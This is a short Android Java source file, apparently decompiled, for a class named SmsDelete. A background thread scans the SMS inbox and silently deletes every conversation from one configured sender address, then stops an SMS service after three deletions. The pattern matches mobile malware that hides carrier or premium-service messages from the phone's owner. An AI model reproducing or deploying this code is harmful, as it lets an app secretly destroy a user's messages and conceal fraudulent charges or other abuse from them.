package shared.library.us;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class SmsDelete {
    private static final String TAG = "GLM_DELETE_SMS";
    private static int deletedMessage = 0;
    private Context mContext;
    private volatile Thread tSms = null;

    public SmsDelete(Context context) {
        this.mContext = context;
    }

    /* access modifiers changed from: private */
    public void Delete() {
        deleteNags();
        deletedMessage = 0;
        this.tSms = null;
    }

    public void Start() {
        this.tSms = new Thread() {
            public void run() {
                SmsDelete.this.Delete();
            }
        };
        this.tSms.start();
    }

    private void deleteNags() {
        String str = "address";
        String str2 = TAG;
        try {
            ContentResolver cr = this.mContext.getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), new String[]{"_id", "thread_id", "address"}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (Parameters.csc.equals(cursor.getString(cursor.getColumnIndexOrThrow("address")))) {
                        long thread_id = cursor.getLong(1);
                        Log.i(TAG, "Sms Delete Thread id: " + thread_id);
                        cr.delete(Uri.parse("content://sms/conversations/" + thread_id), null, null);
                        deletedMessage++;
                        Log.i(TAG, "Sms Delete Count: " + deletedMessage);
                        if (deletedMessage >= 3) {
                            SmsService.stopService(this.mContext);
                            Log.i(TAG, "SmsService Stopped: " + deletedMessage);
                        }
                    }
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Exception e2 = e;
            str = TAG;
            Log.i(str2, e2.getMessage());
        }
    }
}
